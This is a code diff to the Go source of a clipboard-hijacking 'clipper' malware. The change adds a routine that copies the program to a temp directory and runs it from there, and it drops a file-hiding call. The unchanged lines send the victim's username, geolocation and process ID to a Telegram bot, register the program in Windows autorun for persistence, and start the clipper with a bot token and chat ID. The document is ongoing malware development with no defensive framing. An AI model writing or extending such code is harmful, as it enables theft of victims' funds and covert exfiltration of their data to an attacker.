@@ -8,7 +8,7 @@ import (
 
 	"clipper/src/autorun"
 	"clipper/src/clipper"
-	"clipper/src/hide"
+	"clipper/src/selfcopy"
 	"clipper/src/telegram"
 	"clipper/src/utils"
 )
@@ -53,12 +53,16 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
+	selfPath, _ := utils.GetSelfPath()
+	selfName, _ := utils.GetSelfName()
+
+	if selfcopy.RunFromTemp(selfPath) {
+		return
+	}
+
 	user, _ := user.Current()
 	geo := utils.GetGeo()
 	pid := syscall.Getpid()
-
-	selfPath, _ := utils.GetSelfPath()
-	selfName, _ := utils.GetSelfName()
 
 	// send start log to telegram
 	telegram.SendLog(fmt.Sprintf(
@@ -71,9 +75,6 @@ func main() {
 
 	// we adding self to windows autorun
 	_ = autorun.AddToAutorun(selfPath, selfName)
-
-	// we make self hide
-	_ = hide.HideFile(selfPath)
 
 	// we starting main clipper process
 	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)
